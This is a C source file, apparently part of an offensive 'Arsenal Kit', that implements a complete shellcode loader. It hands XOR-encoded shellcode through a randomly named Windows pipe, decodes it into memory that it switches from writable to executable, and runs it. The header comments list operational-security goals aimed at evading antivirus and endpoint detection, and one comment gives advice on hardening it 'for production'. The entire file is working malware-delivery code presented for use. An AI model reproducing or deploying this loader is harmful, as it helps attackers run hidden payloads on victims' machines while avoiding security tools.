/*
 * Starburst Arsenal Kit - Named Pipe Bypass
 *
 * Shellcode is XOR-encoded and written to a randomly-named pipe by a
 * server thread.  The calling thread connects as a client, reads the
 * encoded blob, and XOR-decodes it into executable memory.
 *
 * OPSEC:
 *   - Decoded shellcode never exists in the original PE image.
 *   - The pipe name is random per execution (GUID-based).
 *   - Memory transitions RW -> RX (no RWX).
 *   - Server thread exits before shellcode runs.
 *
 * Build: compiled alongside a main_*.c wrapper (see main_exe.c).
 */

#include <windows.h>

/* XOR key -- change at will; single-byte keeps the example simple.
 * For production, use a multi-byte or rolling key.                  */
#define XOR_KEY  0x5A

/* Maximum shellcode size the pipe will handle (4 MB) */
#define MAX_SC_SIZE  (4 * 1024 * 1024)

/* --------------------------------------------------------------------
 * Generate a random pipe name: \\.\pipe\{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
 * Uses UuidCreate when available, falls back to GetTickCount / pid.
 * ------------------------------------------------------------------ */
typedef long (WINAPI *fnRtlGenRandom)(PVOID, ULONG);

static void generate_pipe_name(char *buf, size_t buflen)
{
    unsigned char rand_bytes[16];
    HMODULE hAdvapi;
    fnRtlGenRandom pRtlGenRandom;
    int i;

    /* Try SystemFunction036 (RtlGenRandom) for cryptographic randomness */
    hAdvapi = GetModuleHandleA("advapi32.dll");
    if (!hAdvapi)
        hAdvapi = LoadLibraryA("advapi32.dll");

    pRtlGenRandom = (fnRtlGenRandom)GetProcAddress(hAdvapi, "SystemFunction036");
    if (pRtlGenRandom)
    {
        pRtlGenRandom(rand_bytes, sizeof(rand_bytes));
    }
    else
    {
        /* Fallback: not cryptographically strong but unique enough */
        DWORD tick = GetTickCount();
        DWORD pid  = GetCurrentProcessId();
        for (i = 0; i < (int)sizeof(rand_bytes); i++)
            rand_bytes[i] = (unsigned char)((tick >> (i % 4 * 8)) ^ (pid + i));
    }

    wsprintfA(buf,
        "\\\\.\\pipe\\{%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x}",
        rand_bytes[0],  rand_bytes[1],  rand_bytes[2],  rand_bytes[3],
        rand_bytes[4],  rand_bytes[5],  rand_bytes[6],  rand_bytes[7],
        rand_bytes[8],  rand_bytes[9],  rand_bytes[10], rand_bytes[11],
        rand_bytes[12], rand_bytes[13], rand_bytes[14], rand_bytes[15]);

    (void)buflen;
}

/* --------------------------------------------------------------------
 * Data passed to the server thread
 * ------------------------------------------------------------------ */
typedef struct _PIPE_CTX {
    char           pipe_name[128];
    unsigned char *shellcode;
    unsigned int   shellcode_len;
} PIPE_CTX;

/* --------------------------------------------------------------------
 * Server thread: create pipe, XOR-encode shellcode, write, close
 * ------------------------------------------------------------------ */
static DWORD WINAPI pipe_server_thread(LPVOID lpParam)
{
    PIPE_CTX *ctx = (PIPE_CTX *)lpParam;
    HANDLE    hPipe;
    DWORD     dwWritten;
    unsigned char *encoded;
    unsigned int i;

    hPipe = CreateNamedPipeA(
        ctx->pipe_name,
        PIPE_ACCESS_OUTBOUND,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        1,                          /* max instances  */
        ctx->shellcode_len + 256,   /* out buffer     */
        0,                          /* in buffer      */
        0,                          /* timeout        */
        NULL                        /* security attrs */
    );

    if (hPipe == INVALID_HANDLE_VALUE)
        return 1;

    /* Wait for the client to connect */
    ConnectNamedPipe(hPipe, NULL);

    /* XOR-encode on the fly into a temporary buffer */
    encoded = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, ctx->shellcode_len);
    if (!encoded)
    {
        CloseHandle(hPipe);
        return 1;
    }

    for (i = 0; i < ctx->shellcode_len; i++)
        encoded[i] = ctx->shellcode[i] ^ XOR_KEY;

    /* Write the encoded shellcode to the pipe */
    WriteFile(hPipe, encoded, ctx->shellcode_len, &dwWritten, NULL);
    FlushFileBuffers(hPipe);

    /* Clean up */
    SecureZeroMemory(encoded, ctx->shellcode_len);
    HeapFree(GetProcessHeap(), 0, encoded);
    DisconnectNamedPipe(hPipe);
    CloseHandle(hPipe);

    return 0;
}

/* --------------------------------------------------------------------
 * Public interface: execute_shellcode
 * ------------------------------------------------------------------ */
void execute_shellcode(unsigned char *shellcode, unsigned int shellcode_len)
{
    PIPE_CTX ctx;
    HANDLE   hServerThread;
    HANDLE   hPipe;
    DWORD    dwRead, dwTotal;
    unsigned char *buf;
    LPVOID   exec_mem;
    unsigned int i;
    DWORD    oldProtect;

    if (!shellcode || shellcode_len == 0 || shellcode_len > MAX_SC_SIZE)
        return;

    /* Build the context for the server thread */
    generate_pipe_name(ctx.pipe_name, sizeof(ctx.pipe_name));
    ctx.shellcode     = shellcode;
    ctx.shellcode_len = shellcode_len;

    /* Start the server thread */
    hServerThread = CreateThread(NULL, 0, pipe_server_thread, &ctx, 0, NULL);
    if (!hServerThread)
        return;

    /* Small delay to let the server thread create the pipe */
    Sleep(50);

    /* Connect as client */
    hPipe = CreateFileA(
        ctx.pipe_name,
        GENERIC_READ,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hPipe == INVALID_HANDLE_VALUE)
    {
        /* Retry once after a short wait */
        Sleep(100);
        hPipe = CreateFileA(ctx.pipe_name, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (hPipe == INVALID_HANDLE_VALUE)
        {
            WaitForSingleObject(hServerThread, 3000);
            CloseHandle(hServerThread);
            return;
        }
    }

    /* Read the XOR-encoded shellcode from the pipe */
    buf = (unsigned char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, shellcode_len);
    if (!buf)
    {
        CloseHandle(hPipe);
        WaitForSingleObject(hServerThread, 3000);
        CloseHandle(hServerThread);
        return;
    }

    dwTotal = 0;
    while (dwTotal < shellcode_len)
    {
        if (!ReadFile(hPipe, buf + dwTotal, shellcode_len - dwTotal, &dwRead, NULL) || dwRead == 0)
            break;
        dwTotal += dwRead;
    }

    CloseHandle(hPipe);

    /* Wait for the server thread to finish */
    WaitForSingleObject(hServerThread, 3000);
    CloseHandle(hServerThread);

    if (dwTotal != shellcode_len)
    {
        SecureZeroMemory(buf, shellcode_len);
        HeapFree(GetProcessHeap(), 0, buf);
        return;
    }

    /* XOR-decode in place */
    for (i = 0; i < shellcode_len; i++)
        buf[i] ^= XOR_KEY;

    /* Allocate executable memory: RW first, then RX */
    exec_mem = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec_mem)
    {
        SecureZeroMemory(buf, shellcode_len);
        HeapFree(GetProcessHeap(), 0, buf);
        return;
    }

    memcpy(exec_mem, buf, shellcode_len);

    /* Wipe the intermediate buffer */
    SecureZeroMemory(buf, shellcode_len);
    HeapFree(GetProcessHeap(), 0, buf);

    /* Flip to RX */
    VirtualProtect(exec_mem, shellcode_len, PAGE_EXECUTE_READ, &oldProtect);

    /* Execute */
    ((void (*)())exec_mem)();

    /* If shellcode returns, free the memory */
    VirtualFree(exec_mem, 0, MEM_RELEASE);
}
